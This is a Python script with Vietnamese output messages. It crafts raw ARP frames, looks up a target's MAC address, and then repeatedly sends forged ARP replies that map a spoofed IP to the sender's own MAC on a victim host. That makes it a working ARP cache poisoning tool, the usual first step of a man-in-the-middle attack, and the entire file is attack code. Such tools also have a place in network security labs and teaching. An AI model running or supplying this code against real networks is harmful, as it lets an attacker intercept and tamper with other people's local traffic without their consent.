#!/usr/bin/env python3
import fcntl
import socket
import struct
import time

ETH_P_ARP = 0x0806
SIOCGIFADDR = 0x8915
SIOCGIFHWADDR = 0x8927
BROADCAST = b"\xff" * 6


def mac_to_str(mac):
    return ":".join("%02x" % b for b in mac)


def mac_to_bytes(mac):
    return bytes(int(p, 16) for p in mac.split(":"))


def iface_info(iface="eth0"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack("256s", iface.encode()[:15])
        ip = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), SIOCGIFADDR, req)[20:24])
        mac = fcntl.ioctl(sock.fileno(), SIOCGIFHWADDR, req)[18:24]
    finally:
        sock.close()
    return ip, mac


def open_arp_socket(iface="eth0"):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
    sock.bind((iface, 0))
    return sock


def build_arp(op, src_mac, src_ip, dst_mac, dst_ip):
    eth = dst_mac + src_mac + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
    arp += src_mac + socket.inet_aton(src_ip) + dst_mac + socket.inet_aton(dst_ip)
    return eth + arp


def parse_arp(frame):
    if len(frame) < 42 or struct.unpack("!H", frame[12:14])[0] != ETH_P_ARP:
        return None
    arp = frame[14:42]
    op = struct.unpack("!H", arp[6:8])[0]
    return {
        "op": op,
        "sender_mac": arp[8:14],
        "sender_ip": socket.inet_ntoa(arp[14:18]),
        "target_mac": arp[18:24],
        "target_ip": socket.inet_ntoa(arp[24:28]),
    }


def resolve_mac(iface, target_ip, timeout=3.0):
    src_ip, src_mac = iface_info(iface)
    sock = open_arp_socket(iface)
    sock.settimeout(0.5)
    req = build_arp(1, src_mac, src_ip, BROADCAST, target_ip)
    deadline = time.time() + timeout
    try:
        while time.time() < deadline:
            sock.send(req)
            try:
                frame = sock.recv(2048)
            except socket.timeout:
                continue
            info = parse_arp(frame)
            if info and info["op"] == 2 and info["sender_ip"] == target_ip:
                return info["sender_mac"]
    finally:
        sock.close()
    raise RuntimeError("Không phân giải được MAC của %s" % target_ip)


def send_arp_reply(iface, spoof_ip, victim_ip, victim_mac, count=30, interval=1.0):
    src_ip, src_mac = iface_info(iface)
    sock = open_arp_socket(iface)
    frame = build_arp(2, src_mac, spoof_ip, victim_mac, victim_ip)
    try:
        sent = 0
        while count <= 0 or sent < count:
            sock.send(frame)
            sent += 1
            print("[+] ARP Reply giả: %s (%s) -> %s (%s)" %
                  (spoof_ip, mac_to_str(src_mac), victim_ip, mac_to_str(victim_mac)))
            time.sleep(interval)
    except KeyboardInterrupt:
        print("[*] Dừng gửi ARP Reply")
    finally:
        sock.close()
